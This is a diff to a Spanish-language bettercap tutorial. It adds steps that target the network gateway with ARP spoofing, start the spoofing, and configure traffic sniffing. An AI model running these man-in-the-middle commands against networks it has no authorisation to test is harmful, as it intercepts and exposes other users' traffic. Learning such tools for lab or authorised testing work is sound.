@@ -71,3 +71,17 @@ net.probe on
 ```bash
 ticker on
 ```
+
+### 5. Asignar la puerta de enlace (gateway) al arp spoofing 
+```bash
+set arp.spoof targets <gatewayIp>
+```
+
+### 6. Iniciar arp spoofng 
+```bash
+arp.spoof on
+```
+### 7. Capturar el trafico de red como si de un wireshark se tratase 
+```bash
+set net.sniff.verbose false
+```
